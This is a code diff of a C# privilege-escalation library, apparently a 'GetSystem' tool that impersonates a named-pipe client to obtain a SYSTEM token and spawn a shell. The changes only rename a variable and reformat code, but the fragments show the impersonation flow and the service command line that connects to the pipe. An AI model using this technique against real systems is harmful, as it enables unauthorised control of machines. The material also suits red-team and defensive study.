@@ -18,7 +18,7 @@ namespace NamedPipeImpersonation.Library
         public static bool GetSystemWithNamedPipe(string command)
         {
             var bSuccess = false;
-            var isImpersonated = false;
+            var bIsImpersonated = false;
 
             do
             {
@@ -106,9 +106,9 @@ namespace NamedPipeImpersonation.Library
                         }
                         else if (NativeMethods.ImpersonateNamedPipeClient(hPipe))
                         {
-                            isImpersonated = (Environment.UserName.Length != 0);
+                            bIsImpersonated = (Environment.UserName.Length != 0);
 
-                            if (isImpersonated)
+                            if (bIsImpersonated)
                             {
                                 string accountName;
                                 Helpers.GetTokenUserName(out string upn, out string domain, out string stringSid, out SID_NAME_USE _);
@@ -157,7 +157,7 @@ namespace NamedPipeImpersonation.Library
                     }
                 }
 
-                if (!isImpersonated || (hPrimaryToken == IntPtr.Zero))
+                if (!bIsImpersonated || (hPrimaryToken == IntPtr.Zero))
                     break;
 
                 Console.WriteLine("[*] Trying to spawn token assigned shell.");
@@ -198,7 +198,7 @@ namespace NamedPipeImpersonation.Library
             if (Globals.ThreadCompletionEvent != IntPtr.Zero)
                 NativeMethods.NtClose(Globals.ThreadCompletionEvent);
 
-            if (isImpersonated)
+            if (bIsImpersonated)
                 NativeMethods.RevertToSelf();
             else
                 Console.WriteLine("[-] Failed to GetSystem.");
@@ -239,8 +239,7 @@ namespace NamedPipeImpersonation.Library
 
                 if (Globals.MethodId == PipeClientMethodType.CmdService)
                 {
-                    binpath = string.Format(
-                        @"{0} /c echo {1} > \\localhost\pipe\{1}",
+                    binpath = string.Format(@"{0} /c echo {1} > \\localhost\pipe\{1}",
                         Environment.GetEnvironmentVariable("COMSPEC"),
                         Globals.ServiceName);
                 }
